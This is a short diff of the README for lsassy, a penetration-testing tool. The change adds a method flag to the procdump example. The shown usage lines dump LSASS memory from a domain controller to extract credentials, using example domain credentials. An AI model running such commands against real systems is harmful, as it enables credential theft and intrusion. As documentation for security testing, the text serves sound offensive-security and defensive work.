@@ -95,7 +95,7 @@ CrackMapExec module is in `cme` folder : [CME Module](https://github.com/Hackndo
 lsassy adsec.local/jsnow:Winter_is_coming@dc01.adsec.local
 
 # Procdump Method
-lsassy -p /tmp/procdump.exe adsec.local/jsnow:Winter_is_coming@dc01.adsec.local
+lsassy -m 2 -p /tmp/procdump.exe adsec.local/jsnow:Winter_is_coming@dc01.adsec.local
 
 # Remote parsing only
 lsassy --dumppath C$/Windows/Temp/lsass.dmp adsec.local/jsnow:Winter_is_coming@dc01.adsec.local
